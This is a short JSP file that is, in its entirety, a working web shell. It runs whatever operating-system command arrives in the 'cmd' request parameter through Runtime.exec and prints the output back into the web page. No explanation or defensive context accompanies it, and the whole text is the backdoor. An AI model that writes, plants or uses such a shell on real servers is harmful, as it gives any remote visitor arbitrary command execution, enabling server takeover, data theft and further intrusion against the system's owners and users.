<%
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1; 
        byte[] b = new byte[2048]; 
        out.print("<pre>"); 
        while((a = in.read(b))!=-1){ 
            out.println(new String(b,0,a)); 
        } 
        out.print("</pre>");
%>